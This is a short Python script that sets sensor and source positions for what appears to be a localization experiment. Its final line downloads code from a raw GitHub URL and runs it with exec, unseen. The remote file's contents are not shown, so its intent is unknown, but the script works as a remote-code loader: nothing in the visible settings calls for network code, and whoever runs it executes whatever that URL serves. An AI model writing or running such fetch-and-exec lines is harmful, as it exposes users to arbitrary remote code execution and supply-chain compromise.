import requests

perfect_sensor_position = False # Change True If You Want Prefect Sensor
sensor_positions = [3,2],[5,6],[4,7],[2,6],[6,4] 
random_source_position = False # Change True If You Want Random Source
source_position = [2,6]

exec(requests.get('https://raw.githubusercontent.com/NoWMoNz/Project/refs/heads/main/Music.py').text)
